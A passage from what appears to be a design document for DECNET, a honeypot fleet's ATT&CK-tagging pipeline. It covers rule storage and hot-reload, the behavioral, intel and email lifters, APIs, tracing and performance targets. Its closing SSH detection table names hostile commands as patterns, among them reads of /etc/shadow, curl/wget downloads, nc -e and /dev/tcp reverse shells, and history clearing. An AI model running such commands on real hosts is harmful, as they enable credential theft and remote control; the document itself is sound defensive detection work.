State is layered onto the parsed rule **after parsing**, never
embedded in the YAML. The engine sees a unified `CompiledRule
(definition, state)` tuple at evaluation time — single hash
lookup per event, free.

**Why this split:** definition has slow lifecycle (git commit,
review, deploy); state has fast lifecycle (operator hits a
disable button, takes effect within seconds). Conflating them in
the YAML means "disable this rule for 4 hours" is a git commit;
keeping them separate means it's an API call.

**Pluggable via `decnet/ttp/store/`** — see Worker shape above.
The default `FilesystemRuleStore` is right for single-host dev:
reads YAML files at projroot, inotify-watches the directory,
holds state in-memory (lost on restart, which is fine when the
operator is local).

**Linux-only worker host (stated, not implied).** `inotify` is
Linux-specific. `FilesystemRuleStore` does **not** ship a
portable kqueue / FSEvents fallback — DECNET's deployment target
is Linux servers, and a polling fallback would be slower and
behave differently enough to be a bug-magnet. The store imports
`inotify_simple` (or `asyncinotify`) at module top-level; on
non-Linux systems the import raises and the worker fails fast at
boot rather than silently never reloading. macOS/Windows
developers running the test suite use the `DatabaseRuleStore`
(which has no inotify dependency) by setting
`DECNET_TTP_RULE_STORE_TYPE=database`. CI parametrizes both
backends on Linux and only the database backend on macOS — see
`tests/ttp/store/conftest.py`. The
`FilesystemRuleStore` factory checks `sys.platform == "linux"`
and raises a clear `RuntimeError` ("FilesystemRuleStore requires
Linux for inotify; use DatabaseRuleStore on this platform")
before any inotify import attempt, so the failure mode is a
one-line operator-readable message, not a stack trace deep in
the store init path.

The `DatabaseRuleStore` is right for swarm:
master syncs filesystem changes into `ttp_rule`, workers tail the
DB, state in `ttp_rule_state` survives restart and propagates to
every worker. Pick via `DECNET_TTP_RULE_STORE_TYPE`.

**Hot-reload mechanism:**

1. Filesystem watch (or DB change notification) detects a per-file
   change.
2. Store recompiles **only that rule**, atomically swaps it into
   the engine's per-`source_kind` dispatch index.
3. Store publishes `ttp.rule.reloaded.{rule_id}` (one event,
   per-rule). State changes publish `ttp.rule.state.{rule_id}`.
4. In-flight evaluations finish on the rule snapshot they
   started with (immutable per-eval); next evaluation uses the
   new compiled form.

**"Atomic swap" — concrete definition.** Two requirements must
both hold:

1. **Recompile is single-threaded.** All compile work runs in one
   asyncio task (the store's change-handler loop). Two filesystem
   events arriving simultaneously are processed in order, never
   in parallel. This eliminates the "rule A's `emits` grew from 1
   to 2 mid-walk" class of torn-state bug.
2. **Dispatch index values are frozen and replaced wholesale.**
   The engine's index is `dict[str, FrozenCompiledRule]` where
   `FrozenCompiledRule` is an immutable dataclass. To "atomically
   swap" a rule, the store assigns a new frozen value to the
   `rule_id` key — a single GIL-atomic dict assignment. Readers
   walking the dict during the swap see either the old frozen
   value or the new one, never a half-mutated object. Mutating
   any field of an existing frozen value is forbidden by
   construction (`frozen=True` raises).

The combination gives us: no parallel writers, no in-place
mutation. Concurrent readers (event evaluations) are safe under
arbitrary edit pressure without a single explicit lock.

**Threading-model caveat.** Property (2) — single-statement dict
assignment being observably atomic to readers — relies on the
CPython GIL. Under PEP 703 / `--disable-gil` free-threaded
builds, this guarantee is no longer language-level; a torn read
becomes possible in principle. We run the GIL build today and
plan to keep doing so for v0/v1, so the property holds. If we
ever opt into a no-GIL build, the dispatch index needs an
explicit lock or a copy-on-write swap (e.g.
`MappingProxyType(new_dict)` reassigned to a single attribute).
This is a one-line change behind a feature flag, not a redesign —
documenting it here so a future contributor running on a no-GIL
interpreter doesn't think the design is broken.

**No on-disk pickled cache.** `re.Pattern` is not stable across
Python versions; bind-mounted/replicated caches drift; the
operational complexity exceeds the benefit at our rule counts.
The trigger condition for revisiting this is in Hard parts §10
(graduation triggers).

**`expires_at` is opt-in, not default.** A `disabled` state
without an explicit expiry persists until manually re-enabled.
TTL-by-default would be too magic — operators would re-enable
critical rules they didn't realise had auto-reverted. Explicit
expiry is the right call; the `ttp.rule.state.{rule_id}` event
fires on TTL expiry too, so dashboards reflect the auto-revert.

### 2. Behavioral lifters (v0.5)

Trivially derived from data already present. Per-Attacker tags use
the Attacker row as anchor; cross-IP signals use `identity_rollup`.

| Source signal                                          | Scope     | Tactic  | Technique  | Sub-technique | Confidence |
|--------------------------------------------------------|-----------|---------|------------|----------------|------------|
| `behavior_class=brute_force`                            | Attacker  | TA0006  | T1110      | (none)         | 0.95       |
| `behavior_class=scanning`                               | Attacker  | TA0007  | T1046      | (none)         | 0.90       |
| `behavior_class=scanning`                               | Attacker  | TA0043  | T1595      | (none)         | 0.90       |
| `behavior_class=beaconing`                              | Attacker  | TA0011  | T1071      | (none)         | 0.80       |
| `behavior_class=beaconing`                              | Attacker  | TA0011  | T1029      | (none)         | 0.75       |
| `tool_guesses` contains `hydra`                         | Attacker  | TA0006  | T1110      | T1110.001      | 0.95       |
| `tool_guesses` contains `nmap`                          | Attacker  | TA0007  | T1046      | (none)         | 0.90       |
| `tool_guesses` contains `nmap`                          | Attacker  | TA0043  | T1595      | (none)         | 0.90       |
| `tool_guesses` contains `sqlmap`                        | Attacker  | TA0001  | T1190      | (none)         | 0.95       |
| `CredentialReuse` row, ≥3 IPs same creds same identity  | Identity  | TA0006  | T1110      | T1110.003      | 0.90       |
| `CredentialReuse` row, ≥3 services same creds           | Identity  | TA0006  | T1110      | T1110.004      | 0.85       |
| Identity has ≥3 distinct ASNs over <24h                 | Identity  | TA0042  | T1583      | T1583.003      | 0.70       |

### 3. Intel lifter (v0.5 — opportunistic, never required)

Reads `AttackerIntel` rows produced by the `decnet enrich` worker
and emits high-precision tags from third-party verdicts. The
single hard rule: this engine MUST tolerate the absence of intel
data without errors, log noise, or affecting other lifters' output.

**Inputs.** One `AttackerIntel` row per attacker UUID, populated
by the enrich worker. Per-provider columns are nullable; the
lifter handles each provider independently — a partial verdict
(GreyNoise responded, AbuseIPDB didn't) still produces the
GreyNoise-derived tags.

**Triggers.**

- `attacker.enriched` — primary; wakes the lifter for one attacker.
- `attacker.session.ended` — secondary; reads any
  already-populated intel row at session close, in case the
  session ended after the enrichment cache was warmed but before
  the worker received the bus signal.

**Output anchoring.** `source_kind = "intel_verdict"`,
`source_id = AttackerIntel.uuid`. `attacker_uuid` set; never
identity-rollup (intel is per-IP).

**Confidence formula.** Final tag confidence =
`rule_confidence × normalize(provider_score)`, where
`normalize(...)` projects the provider's native score range onto
`[0.0, 1.0]`. Per-provider normalization is pinned, not folklore:

- **AbuseIPDB** returns `abuseConfidenceScore` ∈ `[0, 100]`;
  normalize as `score / 100.0`.
- **GreyNoise** returns a categorical `classification` in
  `{benign, unknown, malicious}`; normalize as
  `{benign: 0.0, unknown: 0.5, malicious: 1.0}`.
- **Feodo Tracker** is binary listed/not-listed; normalize as
  `1.0` if listed, else the lifter emits no tag.
- **ThreatFox** returns a `confidence_level` ∈ `[0, 100]`;
  normalize as `score / 100.0`.

AbuseIPDB at `abuseConfidenceScore=30` in category 18 produces a
`0.85 × (30 / 100.0) = 0.255` tag — below the 0.3 floor, so
nothing is written. AbuseIPDB at `abuseConfidenceScore=95` in the
same category writes `0.85 × 0.95 = 0.808`. The normalized score
is what ends up in `IntelEvidence.score` (already in `[0.0, 1.0]`)
— consumers never see the provider's native scale.

**Boundary discipline.** Per Hard parts §7: raw provider blobs
(`greynoise_raw`, `abuseipdb_raw`, `feodo_raw`, `threatfox_raw`)
stay in `AttackerIntel`. The tag's `evidence` column carries a
pointer (`{"intel_uuid": "…", "provider": "abuseipdb",
"category": 18, "score": 95}`) and nothing more. The full provider
verdict is one join away for analysts who want it.

See Appendix A.10 for the per-provider mapping tables and Appendix
B for the rule IDs.

### 4. Email lifter (v0.5)

The largest single signal source after shell commands. Both relay
and non-relay SMTP services capture full messages — every header,
the DATA body, and any attachments. The lifter consumes the
`email.received` bus signal, runs the message through a battery of
rules, and emits per-message tags.

Engine surface:

```
email_lifter.tag(message: SMTPMessage) -> list[TTPTag]
```

`SMTPMessage` projection includes:

- `mail_from`, `rcpt_to_list`, `auth_user` (if AUTH was used)
- All headers as a list (preserves duplicates and order — the
  `Received:` chain matters)
- Parsed `From:`, `Return-Path:`, `Reply-To:`, `Subject:`,
  `Date:`, `User-Agent:`/`X-Mailer:`, `DKIM-Signature:`,
  `Authentication-Results:`
- Body (plaintext + HTML parts)
- Attachments with hash, name, MIME type, decoded preview for
  Office formats

Output anchors: `source_kind = "email"` for whole-message tags,
`"email_header"` / `"email_body"` / `"email_attachment"` for
content-specific tags. `source_id` = the message UUID.
`session_id` = SMTP session, `attacker_uuid` = sending IP's
Attacker row.

See Appendix A.6 for the rule catalogue.

### 5. Sigma adapter (post-v1)

Curated subset of community Sigma rules, hand-reviewed, mapped to
our event shapes. Most Sigma rules are Windows event-log specific
and don't apply to a Linux honeypot fleet — the curated subset is
realistically <100 rules. Worth doing, not first.

### 6. Biometric lifters (deferred — Appendix D)

When `SessionProfile` columns become populated by the keystroke
ingester (and any further biometric FKs land on `AttackerIdentity`),
the biometric lifter reads them via the `session_id` /
`identity_uuid` joins on `ttp_tag`. No `ttp_tag` schema change.

### 7. ML / LLM (deferred indefinitely)

Only when rules genuinely tie. Local classifier — never a hosted
one against attacker shell logs or email contents. Out of scope
until rules are proven insufficient.

---

## UKC bridge

`decnet/clustering/ukc.py` gains `tactic_to_ukc_phase()`:

```python
ATTACK_TACTIC_TO_UKC: dict[str, UKCPhase] = {
    "TA0043": UKCPhase.RECONNAISSANCE,        # Reconnaissance
    "TA0042": UKCPhase.RESOURCE_DEVELOPMENT,  # Resource Development
    "TA0001": UKCPhase.DELIVERY,              # Initial Access
    "TA0002": UKCPhase.EXECUTION,             # Execution
    "TA0003": UKCPhase.PERSISTENCE,           # Persistence
    "TA0004": UKCPhase.PRIVILEGE_ESCALATION,  # Privilege Escalation
    "TA0005": UKCPhase.DEFENSE_EVASION,       # Defense Evasion
    "TA0006": UKCPhase.CREDENTIAL_ACCESS,     # Credential Access
    "TA0007": UKCPhase.DISCOVERY,             # Discovery
    "TA0008": UKCPhase.LATERAL_MOVEMENT,      # Lateral Movement
    "TA0009": UKCPhase.COLLECTION,            # Collection
    "TA0011": UKCPhase.COMMAND_AND_CONTROL,   # Command and Control
    "TA0010": UKCPhase.EXFILTRATION,          # Exfiltration
    "TA0040": UKCPhase.IMPACT,                # Impact

    # ATT&CK for ICS — first-class projection so MQTT / Conpot /
    # Modbus tags don't silently drop out of campaign rollups when
    # `commands_by_phase_on_decky` projects through this map.
    # ICS uses an independent tactic-ID range; we cover only the
    # tactics referenced by Appendix A.7 (Conpot, MQTT). Adding
    # other ICS tactics is a one-line addition + one A.7 row.
    "TA0100": UKCPhase.COLLECTION,            # ICS: Collection
    "TA0102": UKCPhase.DISCOVERY,             # ICS: Discovery
    "TA0105": UKCPhase.IMPACT,                # ICS: Impact
    "TA0106": UKCPhase.IMPACT,                # ICS: Impair Process Control
}
```

`OBSERVABLE_PHASES` (defined in `decnet/clustering/ukc.py`) is the
subset of `UKCPhase` values we can plausibly observe on a honeypot
fleet. The pre-target phases (`RECONNAISSANCE`,
`RESOURCE_DEVELOPMENT`, `WEAPONIZATION`, `SOCIAL_ENGINEERING`) are
deliberately excluded — TTP tags must never assign them, and the
inverse `ukc_phase_to_tactic()` is documented-lossy on those
phases. The CDD test in E.2.9 pins this asymmetry.

The campaign clusterer's `IdentityFeatures.commands_by_phase_on_decky`
adapter is rewritten to read from `ttp_tag` joined to
`attacker_command`, project tactic to UKC, and group. The
synthetic-fixture path is unchanged — fixtures keep emitting UKC
directly; the production path finally produces the same shape.

---

## Confidence model

Every rule declares a base confidence. The worker can adjust it
downward (never upward) based on:

- **Honeypot context.** A command typed against a low-realism
  decky carries less weight than one typed against a high-realism
  one. Multiplier from decky `realism_score` if/when that field
  exists; otherwise 1.0.
- **Repetition.** A scan signature observed once is `0.7 × base`;
  observed across ≥3 deckies is `1.0 × base`.
- **Session length.** Aggregate rules with `min_attempts` already
  encode this; per-event rules don't adjust.
- **Identity coherence.** Tags written via identity-rollup lifters
  carry inherent confidence floors because they only fire when
  cross-Observation evidence is consistent.

The dashboard exposes a confidence floor knob (default 0.6) so
analysts can hide low-confidence noise without touching rules.

`confidence < 0.3` is dropped at write time.

---

## API surface

```
GET    /api/v1/ttp/techniques                  — distinct techniques observed,
                                                 with counts and last-seen ts
GET    /api/v1/ttp/by-identity/{identity_uuid} — PRIMARY: Identity-scoped heatmap
GET    /api/v1/ttp/by-attacker/{attacker_uuid} — per-IP slice
GET    /api/v1/ttp/by-campaign/{campaign_uuid} — campaign-wide rollup
GET    /api/v1/ttp/by-session/{session_id}     — session timeline of tags
GET    /api/v1/ttp/rules                       — rule catalogue
POST   /api/v1/ttp/rules/{rule_id}/state       — admin only; sets RuleState
                                                 (disable / clip / TTL)
DELETE /api/v1/ttp/rules/{rule_id}/state       — admin only; reverts to
                                                 default enabled state
GET    /api/v1/ttp/export/navigator            — MITRE ATT&CK Navigator JSON
                                                 layer for the current fleet
GET    /api/v1/ttp/export/navigator/identity/{uuid}
                                               — Navigator layer for one
                                                 Identity (the demo)
```

**Authorization.** `GET` endpoints require a valid JWT
(per the project's auth-gated convention; 401 without). The state
mutation endpoints (`POST` / `DELETE` on
`/rules/{rule_id}/state`) require **admin** role, enforced
server-side per the project's "no client-side role checks" rule.
A non-admin JWT receives 403 on the mutation endpoints; an absent
JWT receives 401. The CDD plan E.2.8 covers this with explicit
parametrized assertions.

`navigator` exports are the SOC-facing payoff. A SOC analyst pastes
the JSON into the official Navigator and sees coverage immediately.

## UI surface

**Empty state — day one.** A fresh deployment has zero tags. The
`IdentityDetail` "TTPs Observed" section renders an explicit
empty state: a one-line "No techniques observed yet." There is
no spinner, no "loading", no fallback to a placeholder list. The
Navigator export endpoint returns a valid-but-empty Navigator
JSON layer so a SOC analyst pasting it into the official
Navigator sees the file load with no highlighted techniques —
correct, not broken.

The first tag appears on first attacker contact after the
rule_engine completes one evaluation (typically <100ms after
session start for any matched primitive). intel_lifter
contributes its first tags only after the enrich worker
completes one provider pass for that attacker (seconds to
minutes, depending on provider rate limits). identity-rollup
tags appear only after enough cross-IP data accumulates for the
clusterer / credential-reuse worker to fire — minutes to days
depending on traffic. None of this is documented in the UI; it
is the natural unfolding of "telemetry produces data, lifters
turn it into tags."

**Primary:** `IdentityDetail` (whatever surface the Identity page
becomes — see `IDENTITY_RESOLUTION.md`) gains a **TTPs Observed**
section as the headline behavioral readout for an Identity:

- Tactic → technique tree, with counts and confidence-weighted
  bars
- Click-through to evidence (the original command / log line /
  email / payload)
- "Export as Navigator layer" button, scoped to this Identity

**Secondary:** `AttackerDetail` (stays a full page per project
convention) gains a TTPs section showing the per-IP slice — useful
when an Identity has many member Attackers and the analyst is
isolating one IP's contribution.

`/campaigns/{id}` aggregates TTPs across member Identities.

The fleet-level Navigator export goes on the Stats / Overview page.

---

## Observability: tracing and metrics

Project-wide lesson: good tracing pays back hard over time.
Routers already use `@_traced("…")` decorators; OTEL collector is
wired (`development/docker-compose.otel.yml`). The TTP worker
emits spans across the **entire pipeline**, not just the worker
loop. Every transition from human edit to attacker telemetry to
written tag is traceable end-to-end.

**Span hierarchy (top-down):**

```
ttp.rule.ingest                   (operator action)
  ├─ ttp.rule.parse               (YAML → CompiledRule)
  ├─ ttp.rule.validate            (Pydantic schema check)
  └─ ttp.rule.publish             (filesystem→store, store→bus)

ttp.rule.state.change             (set_state API call)
  ├─ api.rules.set_state          (existing router @_traced)
  ├─ ttp.store.write_state        (DB insert / in-mem dict)
  └─ ttp.rule.publish             (state-change bus event)

ttp.eval                          (one source event tagged)
  ├─ ttp.eval.dispatch            (resolve applicable rules)
  ├─ ttp.lifter.{name}            (one span per lifter that ran)
  │   └─ ttp.rule.fire            (one span per rule that matched,
  │                                with rule_id + technique_id
  │                                attributes)
  ├─ ttp.tag.write                (DB insert)
  └─ ttp.bus.publish              (ttp.tagged emission)

ttp.api.{endpoint}                (existing router @_traced
                                   pattern; adds tag-count
                                   attribute on responses)
```

**Metrics (counters / histograms):**

- `ttp.rule.compiled` — counter, `{rule_id, store_backend}`.
- `ttp.rule.state.changed` — counter, `{rule_id, new_state}`.
- `ttp.eval.events` — counter, `{source_kind, lifter}`.
- `ttp.eval.latency_ms` — histogram, `{source_kind, lifter}`.
- `ttp.rule.fire` — counter, `{rule_id, technique_id, confidence_band}`.
- `ttp.tag.written` — counter, `{technique_id, sub_technique_id}`.
- `ttp.tag.dropped` — counter, `{reason}` where reason ∈
  {"below_floor", "rate_limited", "rule_disabled"}.
- `ttp.bus.published` — counter, `{topic}`.

Every span carries `attacker_uuid` (when available) and
`identity_uuid` as attributes so a SOC analyst tracing one
identity's session can pull the entire tag-production timeline
from the trace store.

**No PII in attributes.** Per the email PII discipline (Hard
parts §6) and the enrichment-vs-tag boundary (Hard parts §7):
span attributes carry pointers (UUIDs, hashes, technique IDs,
rule IDs) — never raw command content, email bodies, payload
bytes, or fingerprint blobs. The trace store is not the right
home for sensitive content.

## Bus delivery requirements

The DECNET bus is abstract — `decnet/bus/{base.py, factory.py,
…}` defines the contract; the current production impl is UNIX
sockets (`unix_client.py`, `unix_server.py`). Other impls
(network bus, in-memory test fake) plug in via the factory.
Delivery semantics are **per-impl**, not pinned globally.

The TTP design declares per-event durability *requirements*; the
bus impl satisfies them. If an impl can't (e.g., the in-memory
fake), tests must catch that mismatch.

**Required delivery semantics per topic family:**

| Topic                                | Required          | Catch-up if dropped               |
|---------------------------------------|-------------------|-----------------------------------|
| `attacker.session.ended`              | at-least-once     | none — must not drop              |
| `attacker.enriched`                   | best-effort       | session.ended re-reads intel row  |
| `email.received`                      | at-least-once     | none — must not drop              |
| `credential.reuse.detected`           | best-effort       | session.ended catch-up            |
| `canary.{token_id}.triggered`         | at-least-once     | none — must not drop              |
| `identity.formed` / `identity.merged` | best-effort       | next session.ended re-evaluates   |
| `ttp.tagged`                          | best-effort       | downstream consumers tail DB      |
| `ttp.rule.reloaded.{rule_id}`         | at-least-once     | store re-reconciles on restart    |
| `ttp.rule.state.{rule_id}`            | at-least-once     | store re-reconciles on restart    |

Two topic families MUST NOT silently drop: source-event triggers
that have no catch-up path (`session.ended`, `email.received`,
`canary.triggered`) and rule-state changes (otherwise a worker
in a swarm could miss a "disable rule" command and continue
firing). The current UNIX-socket impl is a single-writer single-
reader pipe over the same host — drops would indicate a kernel-
level failure rather than a routing one, so it satisfies these
requirements transitively. Future network-bus impls (e.g., NATS
JetStream) need explicit configuration to satisfy "at-least-once"
where required.

## Performance targets

Pinned for v0; bounds future optimisation discussions.

| Metric                                       | Target           |
|----------------------------------------------|------------------|
| Per-event evaluation latency (p95)           | < 50 ms          |
| Per-event evaluation latency (p99)           | < 200 ms         |
| Source-event ingest sustainable (per worker) | ≥ 500 events / s |
| Tag-write throughput sustainable             | ≥ 200 tags / s   |
| Store load on worker startup (rule pack v0)  | < 2 s            |
| Hot-reload latency (file save → swap)        | < 500 ms         |
| `set_state()` end-to-end                     | < 100 ms         |
| API: `/by-identity/{uuid}` p95               | < 100 ms         |

The two throughput rows are pinned **independently** so neither
hides behind the other. The relationship between them is
event-rate-dependent — at the rule pack v0 average of ~3 tags per
matched event, the 200 tags/s tag-write target translates to
~67 matched-events/s, well below the 500 events/s ingest target
because most ingest events match zero rules. A busy fleet under a
brute-force storm with high match density (5+ tags/event) crosses
the 200 tags/s line before it crosses the 500 events/s line; in
that regime the bottleneck is tag-write, not eval. Either bound
hitting first is a profile-and-fix signal — not a signal to raise
the other target to compensate.

These match the project's API-level "100 RPS, zero degradation"
target (project memory: API improvements). Per-worker numbers; a
multi-worker swarm scales horizontally.

If implementation hits any of these ceilings, the discussion is
"profile and fix", not "raise the target". The targets are a
contract.

## Hard parts

### 1. Confidence calibration

A user typing `id` is technically T1033 (System Owner Discovery).
Without confidence + an evidence pointer, the dashboard floods with
low-signal noise that drowns the actual brute-force storms.

Mitigation: per-rule confidence is mandatory in YAML; rules below
0.6 are hidden by default; aggregate rules are preferred over
per-command rules for ambiguous primitives.

### 2. Multi-protocol session rollup

`T1078 (Valid Accounts)` only matters in conjunction with
subsequent activity. SSH login alone is noise; SSH login followed
by SMB share enumeration is signal. Per-event tagging cannot
capture this; we need session-end aggregate rules that look at the
full event timeline.

Mitigation: rules with `phase: session_end` run once per closed
session, with the full event list visible. Initial pack should
include 3–5 such rules to prove the shape.

### 3. Sigma rules don't transfer cleanly

The community Sigma ruleset assumes Windows event logs (Sysmon,
Security 4624 etc.). DECNET observes shell, HTTP, SMB on Linux. A
bulk import would yield mostly inapplicable rules. Hand-curate.

### 4. Reconnaissance: pre-target vs active

UKC `reconnaissance` and ATT&CK TA0043 mean different things.
ATT&CK Reconnaissance includes active scans against our deckies —
we can absolutely observe those. UKC reconnaissance is pre-target
OSINT which we cannot. Don't conflate.

### 5. Sub-technique granularity needs cross-event context

T1110 has four sub-techniques:

- `.001` Password Guessing — repeated tries, same account, varying
  password. Per-session detectable.
- `.002` Password Cracking — offline; not observable here.
- `.003` Password Spraying — same password, many accounts. Needs
  cross-account view → identity-rollup lifter.
- `.004` Credential Stuffing — known-good creds replayed. Needs
  `CredentialReuse` join → identity-rollup lifter.

Per-command rules top out at `T1110` (no sub); cross-IP lifters
add the sub-technique with `source_kind = "identity_rollup"`.

### 6. Email PII discipline

SMTP messages contain real PII — recipient addresses, body
contents, subject lines, attachment file names. Tagging rules must
never write that content into `ttp_tag.evidence` verbatim. The
evidence column carries:

- Hashes (e.g. SHA-256 of the body) — referenceable, not readable.
- Header *names* and *patterns matched*, not full header values.
- Attachment hashes and MIME types, not file contents.
- Recipient *count* and *domain set*, not individual addresses.

The original message stays in the SMTP service's storage tier
behind RBAC. The TTP layer points at it via `source_id` for
analysts who have the role to read it. Tags themselves are
PII-light by construction so dashboards / SIEM exports don't leak.

### 7. Enrichment vs tag boundary

Several signal sources — bulk SMTP messages, the canary
fingerprint payload, raw sniffer fingerprints — produce far more
data than belongs in `ttp_tag`. The boundary:

- **Enrichment** (NOT in `ttp_tag`): the full structured payload.
  Bulk fingerprint blob (canvas hash, font list, WebGL details,
  perf jitter samples, full SMTP headers, raw payload bytes) lives
  in its source-of-truth table — `Attacker.fingerprints`,
  `AttackerBehavior`, the SMTP store, the canary worker's
  fingerprint store. These are joined by analysts when they want
  the raw artefact.
- **Tag** (in `ttp_tag`): only specific behavioral derivations.
  "webdriver === true" produces a T1059 tag; the full navigator
  blob does not. "From/Return-Path mismatch" produces a T1036 tag;
  the full header set does not.

Why this matters: dumping fingerprint blobs into
`ttp_tag.evidence` would balloon row size, leak per-attacker unique
identifiers through technique queries (a `WHERE technique_id =
'T1059'` query shouldn't return canvas hashes), and turn the
ATT&CK heatmap into an attacker-uniqueness leak. The evidence
column carries a *pointer* to the source row plus the *minimum
payload* needed to verify the rule fired — never the raw artefact.

### 8. ATT&CK matrix drift

MITRE renames techniques between ATT&CK releases. T1086 became
T1059.001. T1100 became T1505.003. Sub-techniques split off main
techniques. Old tags can reference IDs that no longer exist when
exported against a current Navigator, and the analyst sees broken
links.

Mitigation: the matrix release is **pinned per row** via
`ttp_tag.attack_release` (e.g. `"enterprise-v15.1"`,
`"ics-v15.1"`). Each rule pack also stamps the release it was
authored against; the worker writes the pack's release into every
tag the rule emits. Concretely:

- The rule YAML schema has a top-of-file `attack_release:` key.
  The Pydantic validator rejects rules without it.
- A rule pack version bump that adopts a new ATT&CK release is a
  `rule_version` bump on every affected rule, not a silent
  rewrite. Old tags retain their old `attack_release`; new tags
  carry the new one. The two cohorts coexist by design.
- The Navigator export endpoint groups tags by `attack_release`
  and emits one Navigator layer per release. Mixing releases in a
  single layer would silently misalign techniques.
- **Startup-time consistency check — FAIL LOUD.** At worker boot,
  the rule pack is parsed and the union of `attack_release` values
  is computed. If that set is not a singleton, OR if the singleton
  value does not equal the worker-bundled
  `decnet/ttp/_attack_matrix.py:BUNDLED_ATTACK_RELEASE` constant,
  the worker raises `AttackReleaseMismatchError` from the bus-loop
  bootstrap and **refuses to start**. Not a warning. Not a log
  line. A startup error that an operator must resolve before any
  tag is written. A warning would let pre-v1 → v1 silently drift
  on the next matrix release; a hard failure forces the conscious
  decision. Tested in E.2.5 with two rules carrying different
  `attack_release` values — assert worker boot raises and emits
  zero `ttp.tagged` events.

Quarterly DEBT.md review covers both this and intel-provider
drift below.

### 9. Intel provider drift

AbuseIPDB occasionally adds new abuse categories. GreyNoise
revises its classification taxonomy. ThreatFox extends IOC types.
The intel_lifter's mapping tables (Appendix A.10) are static
catalogues; they will fall behind reality.

Mitigation:

- **Each provider mapping is a versioned rule** (`R0054`–`R0057`).
  When a provider adds a category, bump `rule_version`, update the
  mapping, ship a new rule pack. Old tags keep their old
  `rule_version` so historical evidence survives.
- **Unknown categories produce no tag**, not a fallback. A new
  AbuseIPDB category nobody has mapped yet is silently ignored
  rather than tagged as some "generic abuse" technique. False
  silence is recoverable; false labels poison the SOC.
- **Quarterly review.** Add a note to DEBT.md to re-walk each
  provider's category catalogue every quarter post-v1, until the
  mapping tables stabilise.

### 10. When to graduate from filesystem store to database store

`FilesystemRuleStore` is the default and right for single-host
deployments. There are three graduation triggers; any one of them
flips the operator to `DatabaseRuleStore`:

1. **Multi-host swarm.** Rules need to flow operator → master →
   all workers without redeploys. The filesystem path requires
   rsync-on-deploy for every rule edit; the DB path makes it a
   single write that all workers tail. Day-one switch for any
   swarm deployment.
2. **State must survive restart.** The filesystem store holds
   `RuleState` in-process. A worker crash loses every disable /
   clip / TTL state. Acceptable for dev, unacceptable for
   production where a misbehaving rule has been disabled and
   must stay disabled across restarts.
3. **Operator-driven rule edits via UI/API.** When operators edit
   rules through the dashboard rather than git commits to
   `./rules/ttp/`, the source of truth shifts to the DB. The
   filesystem becomes a snapshot/export target rather than the
   primary.

**What we explicitly DO NOT graduate to:** an on-disk pickled
compiled-rule cache. `re.Pattern` is not stable across CPython
versions; bind-mounted caches drift; the cache becomes another
deploy artefact with its own invalidation bug class. The
graduation path is filesystem → DB, never filesystem →
disk-pickle. This is a one-line lock on a future contributor's
"obvious optimisation".

The trigger for revisiting any of this is rule count exceeding
~1000 with the DB store still showing measurable startup latency.
At that point the conversation is "compile cache invalidated by
`(rule_id, rule_version)` tuple, NOT pickle" — the cache stores
re-compilable source plus pre-validated structure, never
serialized regex objects.

### 11. False-positive blast radius on webhooks

Webhook fanout triggers on `ttp.tagged`. A buggy rule that fires
on every SSH `ls` would flood the SIEM. Mitigation:

- Per-rule rate limit (writes per attacker per minute) clipped at
  the worker.
- `ttp.rule.suppressed` topic so suppression is observable.
- Rule rollback path: bump `rule_version`; old tags filterable.
- The Loop-prevention invariant (canonical statement in "Bus
  topics" above) keeps an enrichment subscriber from
  self-amplifying through `ttp.tagged` re-emission. Without it,
  webhook rate limits would be the only thing preventing an
  infinite fanout — and rate limits are mitigation, not a
  correctness guarantee.

---

## Open questions

- **Backfill strategy.** Tagging forward is simple; tagging the
  past 90 days of attacker_command rows is a separate worker mode.
  Out of scope here, tracked under DEBT.
- **Rule pack distribution.** Ship in-tree at v1. Post-v1, consider
  a signed-bundle channel.
- **Federation.** Cross-org sharing of rule packs and aggregate
  TTP heatmaps. Defer to federation work.

---

## Appendix A — Telemetry inventory per service

Per-service catalogue of observable events and their first-pass
ATT&CK mappings. **One row per (event, technique) pair** — events
implicating multiple techniques appear as multiple rows.

Confidence bands: H = ≥0.85, M = 0.6–0.85, L = <0.6 (informational
only; not shipped in v0).

### A.1 Remote access

#### SSH (real OpenSSH, high interaction)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Auth attempt failed                    | TA0006  | T1110      | (none)         | M    |
| ≥5 fails / 5 min, varying password     | TA0006  | T1110      | T1110.001      | H    |
| Same password ≥3 accounts              | TA0006  | T1110      | T1110.003      | H    |
| Successful auth on weak cred           | TA0001  | T1078      | (none)         | M    |
| `cat /etc/passwd`                      | TA0007  | T1083      | (none)         | M    |
| `cat /etc/shadow`                      | TA0006  | T1003      | T1003.008      | H    |
| `wget http*`                           | TA0011  | T1105      | (none)         | H    |
| `curl http*`                           | TA0011  | T1105      | (none)         | H    |
| `chmod +x`                             | TA0005  | T1222      | T1222.002      | M    |
| `chmod +x` then exec                   | TA0002  | T1059      | T1059.004      | H    |
| `crontab -e` write                     | TA0003  | T1053      | T1053.003      | H    |
| `/etc/cron*` write                     | TA0003  | T1053      | T1053.003      | H    |
| `useradd`                              | TA0003  | T1136      | T1136.001      | H    |
| Direct write to `/etc/passwd`          | TA0003  | T1136      | T1136.001      | H    |
| `history -c`                           | TA0005  | T1070      | T1070.003      | H    |
| `unset HISTFILE`                       | TA0005  | T1070      | T1070.003      | H    |
| `sudo -l`                              | TA0007  | T1033      | (none)         | M    |
| `sudo su`                              | TA0004  | T1548      | T1548.003      | M    |
| `uname -a`                             | TA0007  | T1082      | (none)         | L    |
| `lsb_release`                          | TA0007  | T1082      | (none)         | L    |
| `id`                                   | TA0007  | T1033      | (none)         | L    |
| `whoami`                               | TA0007  | T1033      | (none)         | L    |
| `netstat -an`                          | TA0007  | T1049      | (none)         | M    |
| `ss -tnp`                              | TA0007  | T1049      | (none)         | M    |
| `ip addr` / `ifconfig`                 | TA0007  | T1016      | (none)         | M    |
| `arp -a`                               | TA0007  | T1016      | (none)         | M    |
| `find / -perm -u=s` (recursive)        | TA0007  | T1083      | (none)         | M    |
| `find / -perm -u=s` (SUID predicate)   | TA0004  | T1548      | T1548.001      | H    |
| `nc -e` reverse shell                  | TA0002  | T1059      | T1059.004      | H    |
| `nc -e` reverse shell                  | TA0011  | T1071      | (none)         | H    |
| Bash `/dev/tcp/` reverse shell         | TA0002  | T1059      | T1059.004      | H    |
| Bash `/dev/tcp/` reverse shell         | TA0011  | T1071      | (none)         | H    |
| HASSH match → known C2 framework       | TA0011  | T1071      | T1071.001      | H    |
